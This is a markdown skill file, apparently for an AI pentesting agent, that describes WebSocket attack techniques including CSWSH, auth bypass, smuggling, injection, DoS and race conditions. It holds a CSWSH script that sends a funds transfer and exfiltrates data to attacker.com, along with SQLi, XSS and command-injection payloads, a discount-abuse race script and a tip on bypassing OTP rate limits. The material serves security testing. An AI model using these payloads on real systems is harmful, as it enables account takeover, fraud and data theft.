<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: websocket
description: Exploitation techniques for WebSockets including CSWSH, Smuggling, Auth bypass, and Injection attacks.
---

# WebSocket Vulnerabilities

WebSockets provide full-duplex communication channels over a single TCP connection. Because they differ significantly from standard HTTP request-response patterns, they often bypass traditional security controls (like WAFs) and suffer from unique implementation flaws ranging from Cross-Site WebSocket Hijacking (CSWSH) to complex smuggling and injection attacks.

## Core Concepts & The Handshake

A WebSocket connection begins with an HTTP/1.1 Upgrade request.

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

If successful, the server responds with a `101 Switching Protocols`:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Once established, data is transmitted in binary or text frames. Both directions can send data independently.

---

## 1. Cross-Site WebSocket Hijacking (CSWSH)

CSWSH is the WebSocket equivalent of CSRF. If the WebSocket handshake relies *solely* on surrounding HTTP context (like ambient Cookies or HTTP Basic Auth) for authentication and does not validate the `Origin` header or use anti-CSRF tokens, an attacker can initiate a WebSocket connection from their own domain on behalf of the victim.

**Mechanism:**
1. Victim logs into `target.com` (session cookie is set).
2. Victim visits `attacker.com`.
3. `attacker.com` executes JavaScript to open a WebSocket to `wss://target.com/ws`.
4. The browser automatically attaches the victim's session cookies to the handshake.
5. If `target.com` doesn't validate the `Origin: https://attacker.com` header or require a token in the initial message/URL, the connection succeeds.
6. The attacker can now send and receive frames as the victim.

**Exploitation (Attacker's Server):**
```html
<script>
  // Open WebSocket to the vulnerable target
  var ws = new WebSocket('wss://target.com/ws');

  ws.onopen = function() {
    console.log('CSWSH Successful!');
    // Send malicious action
    ws.send(JSON.stringify({action: 'transfer_funds', amount: 10000, to: 'attacker'}));
  };

  ws.onmessage = function(event) {
    // Exfiltrate received data (e.g., chat history, API keys) back to attacker
    fetch('https://attacker.com/exfil?data=' + btoa(event.data));
  };
</script>
```

**Bypassing Weak Origin Checks:**
- Null Origin: Send from an iframe with a `data:` URI to send `Origin: null`.
- Subdomain Match: If checking `.target.com`, bypass with `attacker-target.com`.
- Trailing Slashes/Ports test.

---

## 2. Authorization and Authentication Bypass

A common misconception is that the initial HTTP handshake secures the *entire lifecycle* of the WebSocket connection. 

**Vulnerability Patterns:**
1. **Per-Message Missing Authorization:** The handshake validates the session, but individual frames requesting privileged actions (e.g., `{"type": "delete_user", "id": 5}`) do not check if the user is an admin.
2. **Channel Subscription Bypass:** WebSockets often use "channels" (e.g., GraphQL subscriptions, ActionCable). If a user sends a poorly validated `{"subscribe": "admin_channel"}`, they might receive broadcasted admin data without authorization checks.
3. **Session Expiration Ignored:** If the HTTP session expires or the user logs out, the existing long-lived WebSocket connection often remains active.

**Testing:**
- Intercept the WebSocket frame using Burp Suite or custom scripts.
- Modify identifiers, user IDs, or role fields in the JSON payload.
- Attempt to subscribe to hidden, administrative, or other user's channels (e.g., `{"channel": "user_1337_private"}`).

---

## 3. WebSocket Smuggling and Desync Attacks

WebSockets can interact disastrously with reverse proxies and load balancers. If the frontend proxy and backend server disagree on whether a connection was successfully upgraded, smuggling occurs.

**Attack Vector (Varnish / Nginx Misconfigurations):**
If a reverse proxy blindly routes the `Upgrade: websocket` header but the backend server rejects it (or doesn't support WebSockets), the frontend might still treat the TCP connection as a raw TCP tunnel, while the backend treats it as an HTTP connection waiting for the next request (HTTP Keep-Alive).

**Exploitation:**
1. Attacker sends an HTTP request claiming to Upgrade to WebSocket.
2. Inside the "WebSocket" body (which is actually sent as cleartext, as the backend didn't upgrade), the attacker smuggles a secondary HTTP request.
3. The backend processes the smuggled request. Since the frontend thinks it's a WebSocket tunnel, the attacker can receive the HTTP response directly or poison another user's request.

---

## 4. Injection Attacks via WebSockets (SQLi, XSS, OS Command)

Because WebSocket frames don't pass through standard HTTP WAFs (which often only inspect HTTP headers, query parameters, and standard POST bodies), they are a prime vector for bypassing perimeter security to deliver injection payloads directly to the application logic.

**Testing:**
WebSockets often carry JSON, XML, or custom binary structures.
- **SQL Injection:** If a frame contains `{"user_id": 12}`, alter it to `{"user_id": "12 OR 1=1"}`. Assess the returned frames for DB errors or changed logic.
- **Blind XSS/Stored XSS:** Chat applications often echo WebSocket input to other connected clients. Injecting `<svg/onload=alert(1)>` via a WebSocket frame will execute on the victim's browser when broadcasted.
- **OS Command Injection:** E.g., `{"command": "ping", "target": "8.8.8.8; id"}`.
- **NoSQL Injection:** E.g., `{"query": {"$ne": null}}`.

---

## 5. Denial of Service (DoS)

WebSocket connections map 1:1 to process threads or file descriptors in many server implementations.

- **Connection Exhaustion (Slowloris over WS):** Opening thousands of connections and sending a frame every 5 minutes keeps the connections alive, exhausting server resources.
- **Payload Size Exploitation:** Sending massive frames (e.g., 50MB of garbage data). If the server attempts to parse or allocate memory for the entire payload before processing, it will crash (OOM).
- **Asymmetric processing:** Sending a very small WebSocket frame that triggers a computationally expensive backend database query or API call, then dropping the connection and repeating.

---

## 6. Race Conditions over WebSockets

Because WebSockets are asynchronous and full-duplex, multiple frames can be sent in rapid succession before the server has time to lock resources or update state (e.g., deducting an account balance).

**Exploitation (Turbo Intruder / Scripting):**
Launch multiple identical frames over the *same* WebSocket connection, or across multiple simultaneous connections, to exploit Time-of-Check to Time-of-Use (TOCTOU) flaws.

```javascript
// Send 20 discount usage requests in 1 millisecond
let ws = new WebSocket("wss://target.com/ecommerce");
ws.onopen = function() {
  for(let i=0; i<20; i++){
     ws.send(JSON.stringify({"action":"apply_discount", "code":"SUMMER50"}));
  }
}
```

---

## 7. WebSockets over HTTP/2 (RFC 8441)

HTTP/2 multiplexes multiple streams over a single TCP connection. RFC 8441 allows WebSockets to operate over HTTP/2 streams (`CONNECT` method with `:protocol: websocket` pseudo-header).
- **Desync via H2:** If a backend downgrades HTTP/2 to HTTP/1.1 poorly, injecting frame boundaries into the HTTP/2 stream can result in HTTP/1.1 request smuggling.

## Testing Methodology

1. **Discovery:** Look for `ws://` or `wss://` in JS files, or filter Burp/ZAP history for `101 Switching Protocols`.
2. **CSWSH Check:** Replay the initial HTTP handshake request with a modified or missing `Origin` header. If the server responds with a `101`, test if you can successfully send/receive data.
3. **WAF Bypass Validation:** Send standard SQLi/XSS payloads over HTTP. If blocked, send the exact same payloads via the WebSocket channel.
4. **Fuzzing Frames:** Use tools like `wscat` or Burp's WebSocket message interception to fuzz JSON keys, values, and frame sizes.
5. **Authorization Matrix:** Open two connections with different privilege levels. Attempt to send privileged structure templates from the lower-privileged connection.

## Detection Tools

```bash
# wscat - CLI wrapper for interacting with WebSockets natively
wscat -c wss://target.com/ws -H "Origin: https://attacker.com"

# SQLMap - Can be tunneled through a WebSocket proxy
# Requires an intermediate script that accepts HTTP from sqlmap and translates to WS frames.

# Stealify/websocket-smuggle
# Testing reverse proxies for WS upgrade misconfigurations
```

## Pro Tips

1. **Examine Ping/Pong Frames:** WebSockets use internal OpCodes for Ping (`0x9`) and Pong (`0xA`) to keep connections alive. Sometimes, sending massive Ping payloads (which RFC says must be echoed back in the Pong) can lead to buffer overflows or DoS.
2. **Binary Framing:** If the application uses binary frames (`OpCode 0x2`) instead of Text frames (often protobufs or MessagePack), standard interception tools might mangle the payload. You will need to write a custom Burp extension or Python script (`websocket-client` library) to serialize/deserialize correctly.
3. **Rate Limiting:** IP-based rate limiting often applies to the *HTTP Handshake endpoint*, but completely ignores the frequency of *frames* sent over the established connection. If you need to brute-force a pin or OTP, do it via WebSocket frames instead of HTTP POSTs.
4. **GraphQL Subscriptions:** Almost all GraphQL subscriptions are implemented via WebSockets (like `subscriptions-transport-ws`). Apply both standard GraphQL attacks (Introspection, Batching DoS) AND WebSocket attacks (CSWSH) simultaneously.
